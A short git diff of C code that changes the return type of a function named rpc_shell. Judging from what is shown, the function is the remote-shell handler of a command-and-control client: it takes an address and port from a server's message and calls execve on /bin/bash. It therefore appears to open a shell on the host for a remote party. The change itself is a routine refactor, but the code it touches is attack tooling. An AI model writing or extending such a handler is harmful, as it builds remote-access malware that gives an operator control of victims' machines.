@@ -9,7 +9,7 @@ struct sockaddr_in get_address(const struct RPCShell shell);
  * @param rpc The message the server sent. 
  * @return int The return error 0 on success negative 1 on failure.
  */
-int rpc_shell(const struct RPC rpc) {
+struct Result rpc_shell(const struct RPC rpc) {
     struct RPCShell shell = shell_serialize(&rpc);
 
     printf("%d %s\n", shell.port, shell.address);
@@ -25,7 +25,7 @@ int rpc_shell(const struct RPC rpc) {
 
     execve("/bin/bash", NULL, NULL);
 
-    return 0;
+    return (struct Result) {status: 0, data: "Ok."};
 }
 
 /**
